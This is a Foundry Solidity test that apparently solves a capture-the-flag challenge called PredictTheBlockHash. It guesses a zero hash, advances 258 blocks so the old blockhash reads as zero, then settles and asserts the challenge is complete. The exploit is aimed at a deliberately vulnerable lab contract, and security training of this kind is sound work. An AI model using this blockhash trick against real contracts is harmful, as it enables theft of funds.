// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import { Test } from "forge-std/Test.sol";
import { PredictTheBlockHashChallengeFactory } from "../src/challenges/09_PredictTheBlockHash/PredictTheBlockHashChallengeFactory.sol";

interface IPredictTheBlockHashChallenge {
    function isComplete() external returns (bool);

    function lockInGuess(bytes32 hash) external payable;

    function settle() external;
}

contract PredictTheBlockHashTest is Test {
    IPredictTheBlockHashChallenge challenge;

    function setUp() public {
        PredictTheBlockHashChallengeFactory factory = new PredictTheBlockHashChallengeFactory();
        address challengeAddress = factory.createChallenge{ value: 1 ether }();
        challenge = IPredictTheBlockHashChallenge(challengeAddress);
    }

    function test() public {
        challenge.lockInGuess{ value: 1 ether }(
            0x0000000000000000000000000000000000000000000000000000000000000000
        );
        vm.roll(block.number + 258);
        challenge.settle();

        assertTrue(challenge.isComplete());
    }

    receive() external payable {}
}
